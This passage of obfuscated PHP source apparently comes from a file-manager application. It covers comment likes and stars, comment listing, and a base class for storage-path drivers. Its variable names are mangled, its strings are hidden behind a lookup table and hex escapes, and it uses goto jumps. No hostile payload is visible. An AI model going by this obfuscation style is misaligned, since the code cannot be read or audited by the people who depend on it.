$this->field($—ô‘½çã)->where($Ô¤à™¢Ó)->group($í°´ıİÀ[505])->select(); return array_to_keyvalue($İñæÙ, $í°´ıİÀ[505], $í°´ıİÀ[500]); } public function starTarget($¾£ûúú×, $ÈÄîïÎ) { $ë‡ŸİÁ³ =& $_SERVER[ĞÂ¤àÓï]; $ñÆĞ§´¯ = $¾£ûúú× + self::TYPE_STAR_OFFSET; $Öõğñø‡ = array($ë‡ŸİÁ³[1664] => USER_ID, $ë‡ŸİÁ³[411] => $ñÆĞ§´¯, $ë‡ŸİÁ³[505] => $ÈÄîïÎ); $·èø”Á„ = $this->where($Öõğñø‡)->find(); if ($·èø”Á„) { return $this->where(array($ë‡ŸİÁ³[399] => $·èø”Á„[$ë‡ŸİÁ³[399]]))->delete(); } $Å±µ’Ó” = array($ë‡ŸİÁ³[1883] => 0, $ë‡ŸİÁ³[1664] => USER_ID, $ë‡ŸİÁ³[749] => 1, $ë‡ŸİÁ³[754] => $ë‡ŸİÁ³[12], $ë‡ŸİÁ³[411] => $ñÆĞ§´¯, $ë‡ŸİÁ³[505] => $ÈÄîïÎ, $ë‡ŸİÁ³[1886] => 0, $ë‡ŸİÁ³[1885] => 0); return $this->add($Å±µ’Ó”); } public function starTargetCount($¡Ó äó, $«êØÈŞ») { $ ËÂ²£… =& $_SERVER[ĞÂ¤àÓï]; $„£æïìõ = $«êØÈŞ» + self::TYPE_STAR_OFFSET; $­¸ƒğı› = $this->commentCount($¡Ó äó, $„£æïìõ); $ˆğÂŸ­ˆ = $this->commentCount($¡Ó äó, $„£æïìõ, USER_ID); return array($ ËÂ²£…[1888] => $­¸ƒğı›, $ ËÂ²£…[1889] => $ˆğÂŸ­ˆ); } public function starTargetUserList($³ëÓËÜ, $§Åõ‡…¢) { $‹àÜô€ã =& $_SERVER[ĞÂ¤àÓï]; $ğš…àë² = $³ëÓËÜ + self::TYPE_STAR_OFFSET; $éÓûß = array($‹àÜô€ã[505] => $§Åõ‡…¢, $‹àÜô€ã[411] => $ğš…àë²); $ù±öÎ = $this->where($éÓûß)->count(); $‹§ˆ‹˜š = array($‹àÜô€ã[255] => $ù±öÎ, $‹àÜô€ã[1890] => array()); if (!$ù±öÎ) { return $‹§ˆ‹˜š; } $³Ğ²şøÚ = $this->field($‹àÜô€ã[1664])->where($éÓûß)->limit(500)->select(); $³Ğ²şøÚ = array_to_keyvalue($³Ğ²şøÚ, $‹àÜô€ã[12], $‹àÜô€ã[1664]); $‹§ˆ‹˜š[$‹àÜô€ã[1890]] = Model($‹àÜô€ã[513])->userListInfo($³Ğ²şøÚ); return $‹§ˆ‹˜š; } public function prasiseUserList($ÉóñÂê”) { $ãÇ£Âä¬ =& $_SERVER[ĞÂ¤àÓï]; $Ø‚Ô’çú = array($ãÇ£Âä¬[1891] => $ÉóñÂê”); $½»…Ğ¾’ = $this->where($Ø‚Ô’çú)->find(); $Ê»÷¢Áï = _get($½»…Ğ¾’, $ãÇ£Âä¬[1886], 0); $ü î£³ = array($ãÇ£Âä¬[255] => $Ê»÷¢Áï, $ãÇ£Âä¬[1890] => array()); if (!$Ê»÷¢Áï) { return $ü î£³; } $¨‹Ã¼†Ø = Model($ãÇ£Âä¬[1892])->field($ãÇ£Âä¬[1664])->where($Ø‚Ô’çú)->limit(500)->select(); $¨‹Ã¼†Ø = array_to_keyvalue($¨‹Ã¼†Ø, $ãÇ£Âä¬[12], $ãÇ£Âä¬[1664]); $ü î£³[$ãÇ£Âä¬[1890]] = Model($ãÇ£Âä¬[513])->userListInfo($¨‹Ã¼†Ø); return $ü î£³; } public function remove($ÊŒŠ‰°) { $µ˜Ìü·ê =& $_SERVER[ĞÂ¤àÓï]; $®˜¬•ğŞ = array($µ˜Ìü·ê[1884] => $ÊŒŠ‰°); $á´ÂûİÁ = $this->where($®˜¬•ğŞ)->find(); if ($á´ÂûİÁ[$µ˜Ìü·ê[1883]]) { $this->where(array($µ˜Ìü·ê[1884] => $á´ÂûİÁ[$µ˜Ìü·ê[1883]]))->setAdd($µ˜Ìü·ê[1885], -1); } return $this->where($®˜¬•ğŞ)->delete(); } public function edit($ÑáÜäŠí, $ä¾Ì±–”) { $ß‰ôŠë =& $_SERVER[ĞÂ¤àÓï]; $ˆ´»×¶ = array($ß‰ôŠë[1884] => $ÑáÜäŠí); return $this->where($ˆ´»×¶)->save(array($ß‰ôŠë[1893] => $ä¾Ì±–”)); } public function prasise($ƒ²¹°ë¿) { $ÖÑè¦ø¤ =& $_SERVER[ĞÂ¤àÓï]; $Æ¦êÚãƒ = Model($ÖÑè¦ø¤[1894]); $ªÈÜƒ“ = array($ÖÑè¦ø¤[1884] => $ƒ²¹°ë¿, $ÖÑè¦ø¤[1655] => USER_ID); $¡Œ†Šø = $Æ¦êÚãƒ->where($ªÈÜƒ“)->find(); if (!$¡Œ†Šø) { $Æ¦êÚãƒ->add($ªÈÜƒ“); $ğùı¹²· = $this->where(array($ÖÑè¦ø¤[1884] => $ƒ²¹°ë¿))->setAdd($ÖÑè¦ø¤[1886], 1); } else { $Æ¦êÚãƒ->where($ªÈÜƒ“)->delete(); $ğùı¹²· = $this->where(array($ÖÑè¦ø¤[1884] => $ƒ²¹°ë¿))->setAdd($ÖÑè¦ø¤[1886], -1); } return $ğùı¹²·; } public function targetInfo($ßÚ—‰ßø, $ÔÊªšØ¶) { $È›™Şìª =& $_SERVER[ĞÂ¤àÓï]; $“âÒ˜Œ‚ = array($È›™Şìª[586] => $ßÚ—‰ßø, $È›™Şìª[587] => $ÔÊªšØ¶); $Ô¬éÜ†‘ = $this->where($“âÒ˜Œ‚)->count(); $ğºÚÓáù = "\122\x49\107\x48\124\x20\x4a\117\111\116\40{$this->tablePrefix}\x63\157\x6d\x6d\145\x6e\164\137\160\162\141\x69\x73\145\x20\x73\164\141\x72\x20\x6f\156\40\x63\157\x6d\x6d\x65\x6e\x74\56\143\157\155\x6d\145\x6e\164\x49\x44\x20\75\x20\163\164\141\162\x2e\143\157\x6d\155\145\156\x74\111\104"; $Ä´Úı¤œ = $this->alias($È›™Şìª[354])->where($“âÒ˜Œ‚)->join($ğºÚÓáù, $È›™Şìª[1895])->count(); $œİ²„¤ = array($È›™Şìª[1896] => $Ô¬éÜ†‘, $È›™Şìª[1897] => $Ä´Úı¤œ); return $œİ²„¤; } public function listData($öŸÃì¡ï) { $²à½ê÷² =& $_SERVER[ĞÂ¤àÓï]; if (isset($öŸÃì¡ï[$²à½ê÷²[1898]])) { if ($öŸÃì¡ï[$²à½ê÷²[1898]]) { $öŸÃì¡ï[$²à½ê÷²[1891]] = array($²à½ê÷²[1014], intval($öŸÃì¡ï[$²à½ê÷²[1898]])); } unset($öŸÃì¡ï[$²à½ê÷²[1898]]); } if (isset($öŸÃì¡ï[$²à½ê÷²[1899]])) { if ($öŸÃì¡ï[$²à½ê÷²[1899]]) { $öŸÃì¡ï[$²à½ê÷²[1891]] = array($²à½ê÷²[1011], intval($öŸÃì¡ï[$²à½ê÷²[1899]])); } unset($öŸÃì¡ï[$²à½ê÷²[1899]]); } return $this->_listData($öŸÃì¡ï); } private function _listData($”¦¡ÉµÚ) { $¯ ä†½ï =& $_SERVER[ĞÂ¤àÓï]; $æÃŞäœ„ = $this->where($”¦¡ÉµÚ)->_makeOrder()->selectPage(100); $this->_listAppendParent($æÃŞäœ„[$¯ ä†½ï[369]]); $this->_listAppendUser($æÃŞäœ„[$¯ ä†½ï[369]]); $this->_listAppendMeta($æÃŞäœ„[$¯ ä†½ï[369]]); return $æÃŞäœ„; } private function _makeOrder() { $Ğ¼²ƒäı =& $_SERVER[ĞÂ¤àÓï]; $üöÙ¨è÷ = array($Ğ¼²ƒäı[1886], $Ğ¼²ƒäı[1885], $Ğ¼²ƒäı[200]); $ÊŞÑºœ‚ = Input::get($Ğ¼²ƒäı[457], $Ğ¼²ƒäı[7], $Ğ¼²ƒäı[423], $üöÙ¨è÷); $«‹Ğ©ĞÑ = Input::get($Ğ¼²ƒäı[458], $Ğ¼²ƒäı[7], $Ğ¼²ƒäı[1657], array($Ğ¼²ƒäı[1900], $Ğ¼²ƒäı[453])); $íŠ¥×å– = $ÊŞÑºœ‚ . $Ğ¼²ƒäı[53] . $«‹Ğ©ĞÑ; return $this->order($íŠ¥×å–); } private function _listAppendParent(&$°…Ë ù²) { $¦ì–èë¼ =& $_SERVER[ĞÂ¤àÓï]; $îıŞò¨ = array_unique(array_to_keyvalue($°…Ë ù², $¦ì–èë¼[12], $¦ì–èë¼[1883])); $îıŞò¨ = array_remove_value($îıŞò¨, $¦ì–èë¼[197]); if (!$îıŞò¨) { return; } $–äà¢ = $this->where(array($¦ì–èë¼[1884] => array($¦ì–èë¼[7], $îıŞò¨)))->select(); $–äà¢ = array_to_keyvalue($–äà¢, $¦ì–èë¼[1891]); foreach ($°…Ë ù² as &$“ğÂÂ“Ù) { if (isset($–äà¢[$“ğÂÂ“Ù[$¦ì–èë¼[1883]]])) { $“ğÂÂ“Ù[$¦ì–èë¼[1901]] = $–äà¢[$“ğÂÂ“Ù[$¦ì–èë¼[1883]]]; } } unset($“ğÂÂ“Ù); } private function _listAppendUser(&$¼‚§Í˜È) { $Ö„êîËá =& $_SERVER[ĞÂ¤àÓï]; $Õ­·­½ç = array_unique(array_to_keyvalue($¼‚§Í˜È, $Ö„êîËá[12], $Ö„êîËá[1664])); $Õ­·­½ç = array_remove_value($Õ­·­½ç, $Ö„êîËá[197]); if (count($Õ­·­½ç) == 0) { return; } foreach ($¼‚§Í˜È as $°ÅôÀ‰ª) { if (isset($°ÅôÀ‰ª[$Ö„êîËá[1901]])) { $Õ­·­½ç[] = $°ÅôÀ‰ª[$Ö„êîËá[1901]][$Ö„êîËá[1664]]; } } $ğİúºéç = Model($Ö„êîËá[535])->userListInfo($Õ­·­½ç); foreach ($¼‚§Í˜È as &$°ÅôÀ‰ª) { $°ÅôÀ‰ª[$Ö„êîËá[600]] = $ğİúºéç[$°ÅôÀ‰ª[$Ö„êîËá[1664]]]; if (isset($°ÅôÀ‰ª[$Ö„êîËá[1901]])) { $°ÅôÀ‰ª[$Ö„êîËá[1901]][$Ö„êîËá[600]] = $ğİúºéç[$°ÅôÀ‰ª[$Ö„êîËá[1901]][$Ö„êîËá[1664]]]; } } unset($°ÅôÀ‰ª); } private function _listAppendMeta(&$µ°Ï•œé) { $˜­×ñ« =& $_SERVER[ĞÂ¤àÓï]; $û’Ÿß = array_unique(array_to_keyvalue($µ°Ï•œé, $˜­×ñ«[12], $˜­×ñ«[1891])); $û’Ÿß = array_remove_value($û’Ÿß, $˜­×ñ«[197]); if (!$û’Ÿß) { return; } foreach ($µ°Ï•œé as $™ÊÂÁù®) { if (isset($™ÊÂÁù®[$˜­×ñ«[1901]])) { $û’Ÿß[] = $™ÊÂÁù®[$˜­×ñ«[1901]][$˜­×ñ«[1891]]; } } $ø“ºÍï° = $this->metaList($û’Ÿß); if (!$ø“ºÍï°) { return !1; } foreach ($µ°Ï•œé as &$™ÊÂÁù®) { $™ÊÂÁù®[$˜­×ñ«[466]] = $ø“ºÍï°[$™ÊÂÁù®[$˜­×ñ«[1891]]]; if (isset($™ÊÂÁù®[$˜­×ñ«[1901]])) { $™ÊÂÁù®[$˜­×ñ«[1901]][$˜­×ñ«[466]] = $ø“ºÍï°[$™ÊÂÁù®[$˜­×ñ«[1901]][$˜­×ñ«[1891]]]; } } unset($™ÊÂÁù®); } private function metaList($Ì¼š¾) { $Şé‘Ô¨ß =& $_SERVER[ĞÂ¤àÓï]; if (!$Ì¼š¾) { return array(); } $Ì¦ĞÒÀß = array($Şé‘Ô¨ß[1891] => array($Şé‘Ô¨ß[7], $Ì¼š¾)); $¹š‰õœÂ = Model($Şé‘Ô¨ß[1902])->where($Ì¦ĞÒÀß)->select(); $¹š‰õœÂ = array_to_keyvalue_group($¹š‰õœÂ, $Şé‘Ô¨ß[1891]); foreach ($¹š‰õœÂ as $ÕÆ»¾™ğ => $Ñ´Ïù˜Ê) { $‚”äŸŒÍ = array(); foreach ($Ñ´Ïù˜Ê as $²Õ‚œ€) { $‚”äŸŒÍ[$²Õ‚œ€[$Şé‘Ô¨ß[94]]] = $²Õ‚œ€[$Şé‘Ô¨ß[374]]; } $¹š‰õœÂ[$ÕÆ»¾™ğ] = $‚”äŸŒÍ; } return $¹š‰õœÂ ? $¹š‰õœÂ : array(); } } goto BØÄîø´–; Aê°ë¿«‘Ü: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $Ñ¶Ò˜´– =& $_SERVER[ĞÂ¤àÓï]; $this->objectDriver = array($Ñ¶Ò˜´–[60], $Ñ¶Ò˜´–[61], $Ñ¶Ò˜´–[62], $Ñ¶Ò˜´–[63], $Ñ¶Ò˜´–[64], $Ñ¶Ò˜´–[65], $Ñ¶Ò˜´–[66], $Ñ¶Ò˜´–[67], $Ñ¶Ò˜´–[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ÜßÀÆÒ’) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ÜßÀÆÒ’, $_SERVER[ĞÂ¤àÓï][8]); } return $ÜßÀÆÒ’; } public function iconvApp($ñ™åÖşš) { return $ñ™åÖşš; } public function iconvSystem($õ¡á) { return $õ¡á; } public function iconvTo($›âŞ—Û, $ÂÙĞÒó¹, $€¨“õ¬­) { $®ï‘äÜÌ =& $_SERVER[ĞÂ¤àÓï]; if (!$›âŞ—Û || !function_exists($®ï‘äÜÌ[69])) { return $›âŞ—Û; } static $„ûµîú = array(); $ªçø²ÄŞ = $ÂÙĞÒó¹ . $®ï‘äÜÌ[70] . $€¨“õ¬­ . $®ï‘äÜÌ[71] . $›âŞ—Û; if (isset($„ûµîú[$ªçø²ÄŞ])) { return $„ûµîú[$ªçø²ÄŞ]; } if (function_exists($®ï‘äÜÌ[72])) { $è‹´£õò = @mb_convert_encoding($›âŞ—Û, $€¨“õ¬­, $ÂÙĞÒó¹); } else { $è‹´£õò = @iconv($ÂÙĞÒó¹, $€¨“õ¬­, $›âŞ—Û); } $è‹´£õò = $è‹´£õò ? $è‹´£õò : $›âŞ—Û; if (strstr($è‹´£õò, $®ï‘äÜÌ[73])) { $è‹´£õò = str_replace($®ï‘äÜÌ[73], $®ï‘äÜÌ[11], $è‹´£õò); } $„ûµîú[$ÂÙĞÒó¹ . $®ï‘äÜÌ[70] . $€¨“õ¬­ . $®ï‘äÜÌ[71] . $›âŞ—Û] = $è‹´£õò; $„ûµîú[$€¨“õ¬­ . $®ï‘äÜÌ[70] . $ÂÙĞÒó¹ . $®ï‘äÜÌ[71] . $›âŞ—Û] = $›âŞ—Û; $„ûµîú[$€¨“õ¬­ . $®ï‘äÜÌ[70] . $ÂÙĞÒó¹ . $®ï‘äÜÌ[71] . $è‹´£õò] = $›âŞ—Û; $„ûµîú[$ÂÙĞÒó¹ . $®ï‘äÜÌ[70] . $€¨“õ¬­ . $®ï‘äÜÌ[71] . $è‹´£õò] = $è‹´£õò; return $è‹´£õò; } public function getPathInner($ÛŠõ„®) { $ç·ô…Ïè = IO::init($ÛŠõ„®); return $ç·ô…Ïè->path; } public function getPathOuter($ñÖØêí) { $ÊĞæÅøø =& $_SERVER[ĞÂ¤àÓï]; $ï¥’şõÖ = strlen(trim($this->pathBase, $ÊĞæÅøø[8])); $ñÖØêí = substr(trim($ñÖØêí, $ÊĞæÅøø[8]), $ï¥’şõÖ); return $this->pathDriver . $ÊĞæÅøø[8] . ltrim($ñÖØêí, $ÊĞæÅøø[8]); } public function isParentOf($ÀöÖ¶âÓ, $Ü™×½´Ğ) { $Ş‡ñ¶ô =& $_SERVER[ĞÂ¤àÓï]; $ÀöÖ¶âÓ = rtrim(strtolower($ÀöÖ¶âÓ), $Ş‡ñ¶ô[8]) . $Ş‡ñ¶ô[8]; $Ü™×½´Ğ = rtrim(strtolower($Ü™×½´Ğ), $Ş‡ñ¶ô[8]) . $Ş‡ñ¶ô[8]; $»·îª° = strpos($Ü™×½´Ğ, $ÀöÖ¶âÓ) === 0; return $»·îª°; } public function getType() { $­Òşà²Ğ =& $_SERVER[ĞÂ¤àÓï]; $Ç¼èµ§ = str_replace($­Òşà²Ğ[74], $­Òşà²Ğ[12], get_class($this)); return strtolower($Ç¼èµ§); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($…±ôäÇ›, $ëÒˆè„ ) { $Ö”êØ­ =& $_SERVER[ĞÂ¤àÓï]; $¦ú›°Íè = rtrim($…±ôäÇ›, $Ö”êØ­[8]) . $Ö”êØ­[8] . $ëÒˆè„ ; $üÍ”·¶è = $this->exist($¦ú›°Íè); return $üÍ”·¶è ? $¦ú›°Íè : !1; } public function setModifyTime($îÅªÙ„, $è ¡™ğü = '') { } public function renameObject($¼òç¨î, $×ÛéêóÊ) { $È÷¦ÂßÔ = $×ÛéêóÊ; $¼òç¨î = $this->getPathOuter($¼òç¨î); $×ÛéêóÊ = $this->pathFather($¼òç¨î) . $×ÛéêóÊ; $İÚÀÌÄ = IO::copy($¼òç¨î, $this->pathFather($¼òç¨î), REPEAT_RENAME_FOLDER, $È÷¦ÂßÔ); if ($İÚÀÌÄ) { IO::remove($¼òç¨î); } return $İÚÀÌÄ ? $×ÛéêóÊ : !1; } public function tempFile($ãëş•½¹ = '', $îúÈÇ» = '') { if (!$ãëş•½¹) { $ãëş•½¹ = rand_string(15); } $¯Ù¶ŠŸï = TEMP_FILES . rand_string(15) . $_SERVER[ĞÂ¤àÓï][8]; @mkdir($¯Ù¶ŠŸï, DEFAULT_PERRMISSIONS, !0); $îÎ“õÂ = $¯Ù¶ŠŸï . $ãëş•½¹; @touch($îÎ“õÂ); if ($îúÈÇ») { file_put_contents($îÎ“õÂ, $îúÈÇ»); } return $îÎ“õÂ; } public function tempFileRemve($¡ºÆüÔò) { @unlink($¡ºÆüÔò); @rmdir($this->pathFather($¡ºÆüÔò)); } public function mkfile($÷²°ßÀÜ, $—ò£ã´± = '', $©™éœ­’ = REPEAT_RENAME) { } public function mkdir($¬‚ìÅá©, $ÎÍà±Ôš = REPEAT_SKIP) { } public function delFile($·ıøàªÛ) { } public function delFolder($Ïò©òˆ) { } public function copyFile($‚ûğ–È½, $Ñ±ç¦Í) { } public function moveFile($ñĞ¾ƒƒ˜, $À×Î¿§Î) { } public function remove($×ÖÉÈëø) { if ($this->isFile($×ÖÉÈëø)) { return $this->delFile($×ÖÉÈëø); } return $this->delFolder($×ÖÉÈëø); } public function rename($·ë‰»›, $–äì•Ì‡) { } public function exist($±–Ğé—) { } public function findByHash($ê‡…ø™ = '', $ïäÈ“¾ = '') { return !1; } public function isFile($Ç­¿Ú¼) { } public function isFolder($ï¡ÍóëÂ) { } public function size($÷—ã˜¾®) { } public function info($òÜ«áš‹) { } public function infoSimple($ŞİôŞ¥Ì) { return $this->info($ŞİôŞ¥Ì); } public function infoAuth($İ’¡ÔøÄ) { return $this->info($İ’¡ÔøÄ); } public function infoFull($øó÷¼êÆ) { return $this->info($øó÷¼êÆ); } public function infoWithChildren($¤ÎÖıÜº) { $øØàê¹• =& $_SERVER[ĞÂ¤àÓï]; static $ñ¨“Ÿ›ô = array(); if (isset($ñ¨“Ÿ›ô[$¤ÎÖıÜº])) { return $ñ¨“Ÿ›ô[$¤ÎÖıÜº]; } $ÏÈü»Ø‰ = $this->info($¤ÎÖıÜº); if ($ÏÈü»Ø‰ && $ÏÈü»Ø‰[$øØàê¹•[33]] == $øØàê¹•[75]) { $ùç±—¥¼ = array($øØàê¹•[76] => 0, $øØàê¹•[77] => 0, $øØàê¹•[78] => 0); $this->infoChildren($¤ÎÖıÜº, $ùç±—¥¼); $ÏÈü»Ø‰[$øØàê¹•[76]] = $ùç±—¥¼[$øØàê¹•[76]]; $ÏÈü»Ø‰[$øØàê¹•[79]] = array($øØàê¹•[80] => $ùç±—¥¼[$øØàê¹•[77]], $øØàê¹•[81] => $ùç±—¥¼[$øØàê¹•[78]]); $ñ¨“Ÿ›ô[$¤ÎÖıÜº] = $ÏÈü»Ø‰; } return $ÏÈü»Ø‰; } public function listPath($Îˆ­Ù£, $ÕÁ‰»«’ = false) { } public function has($Òì‹©Ñ, $öòã¬õ = false, $¡–”ƒµª = false) { } public function canRead($§®‰¢Õè) { } public function canWrite($ó—ô­¨“) { } public function getContent($„Øú÷Ä±) { } public function setContent($¹òÒË¿», $Ú¡ˆÑçù = '') { } protected function infoChildren($À­ÚŠìÔ, &$Ú€¼²äö) { $ÃüåÓ‚‚ =& $_SERVER[ĞÂ¤àÓï]; check_abort_echo(); $É·ïà = $this->listPath($À­ÚŠìÔ, !0); $É·ïà = array_merge($É·ïà[$ÃüåÓ‚‚[82]], $É·ïà[$ÃüåÓ‚‚[83]]); foreach ($É·ïà as $ÄÄªüõå) { if ($ÄÄªüõå[$ÃüåÓ‚‚[33]] == $ÃüåÓ‚‚[75]) { $Ú€¼²äö[$ÃüåÓ‚‚[78]]++; $Úø£ªƒ = $this->getPathInner($ÄÄªüõå[$ÃüåÓ‚‚[84]]); $this->infoChildren($Úø£ªƒ, $Ú€¼²äö); } else { $Ú€¼²äö[$ÃüåÓ‚‚[77]]++; $Ú€¼²äö[$ÃüåÓ‚‚[76]] += $ÄÄªüõå[$ÃüåÓ‚‚[76]]; } } } public function fileSubstr($ÔÂ«Ô‚–, $ø¼×ÅÙ§, $¢ƒ¶Öº¤) { } public function listAll($ìãİÎÅñ) { } public function listAllMake($±¤ØÇ£Õ, &$ÇˆïÁ“®) { $éÉ†Î¨„ =& $_SERVER[ĞÂ¤àÓï]; check_abort_echo(); $öÉÂ£™í = $this->listPath($±¤ØÇ£Õ, !0); if (!$öÉÂ£™í) { return; } $š­„¢ê = array_merge($öÉÂ£™í[$éÉ†Î¨„[82]], $öÉÂ£™í[$éÉ†Î¨„[83]]); foreach ($š­„¢ê as $‹´øÉã†) { $°ë»ìƒ½ = $‹´øÉã†[$éÉ†Î¨„[33]] == $éÉ†Î¨„[75]; $œ½ìŒ¶ = array($éÉ†Î¨„[84] => $‹´øÉã†[$éÉ†Î¨„[84]], $éÉ†Î¨„[75] => $°ë»ìƒ½); if (isset($‹´øÉã†[$éÉ†Î¨„[76]])) { $œ½ìŒ¶[$éÉ†Î¨„[76]] = $‹´øÉã†[$éÉ†Î¨„[76]]; } if (isset($‹´øÉã†[$éÉ†Î¨„[85]])) { $œ½ìŒ¶[$éÉ†Î¨„[85]] = $‹´øÉã†[$éÉ†Î¨„[85]]; } if (!$°ë»ìƒ½) { $ÇˆïÁ“®[] = $œ½ìŒ¶; continue; } $ÇˆïÁ“®[] = $œ½ìŒ¶; $¾Ãªş = $‹´øÉã†[$éÉ†Î¨„[84]]; $šç¤ÎÁä = $this->pathDriver; if (substr($‹´øÉã†[$éÉ†Î¨„[84]], 0, strlen($šç¤ÎÁä)) == $šç¤ÎÁä) { $¾Ãªş = substr($¾Ãªş, strlen($šç¤ÎÁä)); } $this->listAllMake($¾Ãªş, $ÇˆïÁ“®); } } public function listAllSimple($µÙü¿Ú) { $ÇÆ¨‹ÖÙ =& $_SERVER[ĞÂ¤àÓï]; $¡ë€¼¿  = array(); $¼Ã¯˜˜  = $this->listAll($µÙü¿Ú); $ôÄ³å¡ª = $this->getPathOuter($µÙü¿Ú); foreach ($¼Ã¯˜˜  as $Ï©˜Š—) { $‰ÌÇ¿Ô± = $Ï©˜Š—[$ÇÆ¨‹ÖÙ[84]]; $±½öº£ = $Ï©˜Š—[$ÇÆ¨‹ÖÙ[84]]; if (isset($Ï©˜Š—[$ÇÆ¨‹ÖÙ[86]])) { $‰ÌÇ¿Ô± = $Ï©˜Š—[$ÇÆ¨‹ÖÙ[86]][$ÇÆ¨‹ÖÙ[84]]; $Ï©˜Š—[$ÇÆ¨‹ÖÙ[76]] = $Ï©˜Š—[$ÇÆ¨‹ÖÙ[86]][$ÇÆ¨‹ÖÙ[76]]; $Ï©˜Š—[$ÇÆ¨‹ÖÙ[85]] = $Ï©˜Š—[$ÇÆ¨‹ÖÙ[86]][$ÇÆ¨‹ÖÙ[85]]; } else { $±½öº£ = substr($Ï©˜Š—[$ÇÆ¨‹ÖÙ[84]], strlen(get_path_father($ôÄ³å¡ª))); $±½öº£ = $ÇÆ¨‹ÖÙ[8] . ltrim($±½öº£, $ÇÆ¨‹ÖÙ[8]); } $•ıı…š = array($ÇÆ¨‹ÖÙ[84] => $±½öº£, $ÇÆ¨‹ÖÙ[75] => $Ï©˜Š—[$ÇÆ¨‹ÖÙ[75]]); if (isset($Ï©˜Š—[$ÇÆ¨‹ÖÙ[76]]) && !$Ï©˜Š—[$ÇÆ¨‹ÖÙ[75]]) { $•ıı…š[$ÇÆ¨‹ÖÙ[76]] = $Ï©˜Š—[$ÇÆ¨‹ÖÙ[76]]; } if (isset($Ï©˜Š—[$ÇÆ¨‹ÖÙ[85]])) { $•ıı…š[$ÇÆ¨‹ÖÙ[85]] = $Ï©˜Š—[$ÇÆ¨‹ÖÙ[85]]; } if (!$Ï©˜Š—[$ÇÆ¨‹ÖÙ[75]]) { $•ıı…š[$ÇÆ¨‹ÖÙ[87]] = $‰ÌÇ¿Ô±; } $¡ë€¼¿ [] = $•ıı…š; } return $¡ë€¼¿ ; } public function upload($Èâî÷ç‹, $ÊÑÑ£§, $¸—€š¢ğ = false, $Ş±º£ì = REPEAT_REPLACE) { } public function uploadFileByID($Ê·¥ß®œ, $Ÿ’¸‹òõ, $€ò»±®) { } public function uploadFileByPath($ËÈëİÂ, $Ğ’æ¥ğ», $¿³ëì¦ï = array()) { } public function isUploadServer() { $¥’ÏÓŸ =& $_SERVER[ĞÂ¤àÓï]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $¥’ÏÓŸ[88]) { return !0; } return $GLOBALS[$¥’ÏÓŸ[6]][$¥’ÏÓŸ[89]][$¥’ÏÓŸ[90]]; } public function isFileOutServer() { $Ö«Õœé– =& $_SERVER[ĞÂ¤àÓï]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Ö«Õœé–[88]) { return !0; } return $GLOBALS[$Ö«Õœé–[6]][$Ö«Õœé–[89]][$Ö«Õœé–[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($½š’µêë) { $Ûì“Ûİ¤ =& $_SERVER[ĞÂ¤àÓï]; if (!$this->isCdnHost()) { return $½š’µêë; } return str_replace(trim(get_url_root($½š’µêë), $Ûì“Ûİ¤[8]), trim($this->cdnHost, $Ûì“Ûİ¤[8]), $½š’µêë); } public function uploadLink($üßéí‚, $„Ö‰‰ª« = 0) { $©ƒª ¤ò =& $_SERVER[ĞÂ¤àÓï]; if ($this->isUploadServer()) { return; } $‹»–“× = $this->getType(); if (!in_array($‹»–“×, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Û¼ã„ÂÅ = 1024 * 1024 * 10; $¤ûƒçÄÎ = $„Ö‰‰ª« <= $Û¼ã„ÂÅ ? $©ƒª ¤ò[92] : $©ƒª ¤ò[93]; $¹ŞÔÖí = (!$„Ö‰‰ª« ? 1 : ceil($„Ö‰‰ª« / pow(1024, 3))) * 3600 * 4; $“İ›¶ïÛ = $this->{$¤ûƒçÄÎ}($üßéí‚, $¹ŞÔÖí); if ($“İ›¶ïÛ) { $“İ›¶ïÛ[$©ƒª ¤ò[94]] = $üßéí‚; $“İ›¶ïÛ[$©ƒª ¤ò[95]] = $‹»–“×; } return $“İ›¶ïÛ; } public function uploadFormData($ëöŸá»­, $Ó¸×ò¼ = 3600) { } public function multiUploadFormData($Ä¥ÇßÕª, $‹ª¯œîº = 3600) { } public function download($¾ÔàŒÓ , $ÉèÄ…„ô) { } public function ext($Ÿª§Ãø‘) { $ŒÎÎâä =& $_SERVER[ĞÂ¤àÓï]; if (strpos($Ÿª§Ãø‘, $ŒÎÎâä[8]) === -1) { $™ —úş¼ = $Ÿª§Ãø‘; } else { $™ —úş¼ = $this->pathThis($Ÿª§Ãø‘); } $ÊÙñ‰àç = $ŒÎÎâä[12]; if (strstr($™ —úş¼, $ŒÎÎâä[10])) { $ÊÙñ‰àç = substr($™ —úş¼, strrpos($™ —úş¼, $ŒÎÎâä[10]) + 1); $ÊÙñ‰àç = strtolower($ÊÙñ‰àç); } if (strlen($ÊÙñ‰àç) > 3 && preg_match($ŒÎÎâä[96], $ÊÙñ‰àç, $Â¿…š˜˜)) { $ÊÙñ‰àç = $ŒÎÎâä[12]; } return $ÊÙñ‰àç; } public function pathThis($šÀÉ«ô) { $É˜¶‰–· =& $_SERVER[ĞÂ¤àÓï]; $šÀÉ«ô = str_replace($É˜¶‰–·[97], $É˜¶‰–·[8], rtrim($šÀÉ«ô, $É˜¶‰–·[8])); $ëÄÑİå† = strrpos($šÀÉ«ô, $É˜¶‰–·[8]); if ($ëÄÑİå† === !1) { return $šÀÉ«ô; } return substr($šÀÉ«ô, $ëÄÑİå† + 1); } public function pathFather($µØÑÔì) { $ú·ØæÕ =& $_SERVER[ĞÂ¤àÓï]; $µØÑÔì = str_replace($ú·ØæÕ[97], $ú·ØæÕ[8], rtrim($µØÑÔì, $ú·ØæÕ[8])); $úÑñ©Ü² = strrpos($µØÑÔì, $ú·ØæÕ[8]); if ($úÑñ©Ü² === !1) { return $ú·ØæÕ[12]; } return substr($µØÑÔì, 0, $úÑñ©Ü² + 1); } public function hashSimple($³Â‹ã´©) { $¡•ÏÔ Ğ =& $_SERVER[ĞÂ¤àÓï]; if (!$³Â‹ã´©) { return md5($¡•ÏÔ Ğ[12]); } $²†ÒáĞ = $this->size($³Â‹ã´©); $ú–æ¾ = 200; $‘Ìê´À = 50; if ($²†ÒáĞ <= 